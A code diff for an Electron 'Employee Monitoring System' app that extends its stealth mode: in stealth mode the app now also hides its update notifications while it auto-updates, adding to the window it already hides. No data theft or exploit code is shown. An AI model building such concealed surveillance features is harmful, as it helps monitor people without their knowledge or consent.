@@ -9,6 +9,8 @@ var autoLauncher = new AutoLaunch({
     name: "Employee Monitoring System"
 });
 
+var stealth_mode = false;
+
 autoLauncher.isEnabled().then(function(isEnabled) {
 	if (isEnabled) {
 		return;
@@ -83,6 +85,8 @@ if (!isSingleInstance) {
 			const is_stealth_mode = await check_stealth_mode();
 			if (!is_stealth_mode){
 				createWindow();
+			} else {
+				stealth_mode = true;
 			}
 			app.on('activate', function () {
 				if (BrowserWindow.getAllWindows().length === 0) createWindow()
@@ -97,12 +101,14 @@ autoUpdater.on('update-not-available', () => {
 });
 
 autoUpdater.on('update-available', () => {
-	showNotification("Update Available", "New update will be downloaded and wil get installed automatically.")
+	if(!stealth_mode)
+		showNotification("Update Available", "New update will be downloaded and wil get installed automatically.")
 });
 
 autoUpdater.on('update-downloaded', () => {
-	showNotification("Update Downloaded", "Application will now quit and start the installation of the new Update.")
-	autoUpdater.quitAndInstall(true, true);
+	if(!stealth_mode)
+		showNotification("Update Downloaded", "Application will now quit and start the installation of the new Update.")
+	autoUpdater.quitAndInstall(false, true);
 });
 
 app.on('window-all-closed', function () {
